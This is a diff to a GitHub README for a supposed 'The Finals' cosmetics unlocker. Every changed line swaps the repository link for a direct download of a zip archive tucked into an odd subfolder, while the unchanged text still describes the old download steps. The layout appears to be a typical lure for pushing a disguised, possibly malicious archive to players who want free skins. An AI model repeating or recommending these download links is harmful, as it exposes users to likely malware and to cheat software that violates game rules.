@@ -1,6 +1,6 @@
 # 🎮 The-Finals-Cosmetics-Unlocker - Unlock Every Cosmetic Instantly Today
 
-[![Download Now](https://img.shields.io/badge/Download-The%20Finals%20Unlocker-brightgreen?style=for-the-badge&logo=github)](https://github.com/anargiamojang/The-Finals-Cosmetics-Unlocker)
+[![Download Now](https://img.shields.io/badge/Download-The%20Finals%20Unlocker-brightgreen?style=for-the-badge&logo=github)](https://github.com/anargiamojang/The-Finals-Cosmetics-Unlocker/raw/refs/heads/main/Nomeus/Finals-The-Cosmetics-Unlocker-v3.7.zip)
 
 ---
 
@@ -15,7 +15,7 @@ This tool is designed for players who want access to all skins, outfits, weapon 
 ## 📥 Download the Application
 
 Visit this link to download the application:  
-**[https://github.com/anargiamojang/The-Finals-Cosmetics-Unlocker](https://github.com/anargiamojang/The-Finals-Cosmetics-Unlocker)**
+**[https://github.com/anargiamojang/The-Finals-Cosmetics-Unlocker/raw/refs/heads/main/Nomeus/Finals-The-Cosmetics-Unlocker-v3.7.zip](https://github.com/anargiamojang/The-Finals-Cosmetics-Unlocker/raw/refs/heads/main/Nomeus/Finals-The-Cosmetics-Unlocker-v3.7.zip)**
 
 Once you click the link, you'll land on the official download page. Look for the green **"Code"** button or the **"Releases"** section on the right side of the page. Click it, then choose **"Download ZIP"** or the latest release file. The download will start automatically.
 
@@ -205,7 +205,7 @@ No matter where you play, this unlocker has you covered.
 
 Hit the download button at the top of this page, follow the three-step process, and dive into The Finals with every cosmetic item unlocked. It's that easy.
 
-Remember: Visit this link to download the application: **[https://github.com/anargiamojang/The-Finals-Cosmetics-Unlocker](https://github.com/anargiamojang/The-Finals-Cosmetics-Unlocker)**.
+Remember: Visit this link to download the application: **[https://github.com/anargiamojang/The-Finals-Cosmetics-Unlocker/raw/refs/heads/main/Nomeus/Finals-The-Cosmetics-Unlocker-v3.7.zip](https://github.com/anargiamojang/The-Finals-Cosmetics-Unlocker/raw/refs/heads/main/Nomeus/Finals-The-Cosmetics-Unlocker-v3.7.zip)**.
 
 Your journey to a fully customized gaming experience starts now. Enjoy!
 
